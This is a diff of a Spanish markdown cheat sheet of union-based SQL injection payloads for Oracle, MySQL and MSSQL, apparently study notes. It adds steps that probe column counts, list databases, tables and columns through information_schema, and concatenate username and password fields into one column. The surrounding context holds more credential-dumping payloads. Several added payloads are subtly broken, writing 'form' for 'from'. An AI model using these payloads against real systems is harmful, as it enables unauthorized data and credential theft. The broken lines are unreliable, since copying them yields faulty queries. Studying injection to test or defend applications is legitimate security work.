@@ -1,5 +1,5 @@
 # Identificación de versión y motor de base de datos
-#### Oracle
+### Oracle
 Identificar el numero de columnas
 `' order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
 
@@ -10,7 +10,7 @@ Una vez ya hemos identificado las columnas debemos probar con un
 Para extraer la versión
 `' union select 'a',banner from v$version-- -`, nos devolverá toda la información de la base de datos
 
-#### MySQL y MSSQL
+### MySQL y MSSQL
 Identificar el numero de columnas
 `'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
 
@@ -22,14 +22,14 @@ Para extraer la versión
 
 # Listar numero de columnas de una tabla
 
-#### Identificando cadenas nulas
+### Identificando cadenas nulas
 Identificar el numero de columnas
 `'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
 
 Una vez ya hemos identificado las columnas debemos probar con un
 `' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select, en este caso nos devolvería una cadena de valores vacíos
 
-#### Identificando cadenas con texto
+### Identificando cadenas con texto
 Identificar el numero de columnas
 `'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
 
@@ -39,7 +39,7 @@ Una vez ya hemos identificado las columnas debemos probar con un
 Si queremos encontrara una cadena por ejemplo CADENA123
 `' union select NULL,CADENA123-- -` y nos mostrara esta cadena
 
-#### Identificando datos de otras tablas
+### Identificando datos de otras tablas
 Identificar el numero de columnas
 `'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
 
@@ -60,9 +60,23 @@ Ver datos de las columnas de la tabla seleccionada
 
 
 ### Listar múltiples valores en una sola columna
+Identificar el numero de columnas
+`'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
 
+Una vez ya hemos identificado las columnas debemos probar con un
+`' union select NULL,NULL-- -`, nos devuelve los valores introducidos en el union select, al no devolvernos error podemos buscar en otra tabla
 
+Buscar las bases de datos disponibles
+`' union select NULL,schema_name form information_schema.schemata-- -` nos muestra las bases de datos
 
+Usar una base de datos que nos interesa y mostrar sus tablas
+`' union select NULL,table_name form information_schema.tables where table_schema='nombrebbdd'-- -`
+
+Ver las columnas de la tabla que nos interesa
+`' union select NULL,column_name form information_schema.columns where table_schema='nombrebbdd' and table_name='nombretabla'-- -`
+
+Concatenar el contenido en una sola columna
+`' union select NULL,username||':'||password form nombretabla-- -`
 
 # Listar contenido de las bases de datos
 
@@ -83,7 +97,7 @@ Mostrar el contenido de la tabla seleccionada
 `' union select username,password from nombretabla-- -`
 
 
-#### MySQL y MSSQL
+### MySQL y MSSQL
 Identificar el numero de columnas
 `'order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
 
@@ -106,3 +120,5 @@ También se pude jugar con concat o group_concat (0x3a hace referencia a ':' )
 `' union select 1,concat(username,0x3a,password) from nombretabla.nombrecolumna-- -`
 `' union select 1,group_concat(username,0x3a,password) from nombretabla.nombrecolumna-- -`
 
+# Inyección Blind (Ciega)
+### Con respuestas condicionales
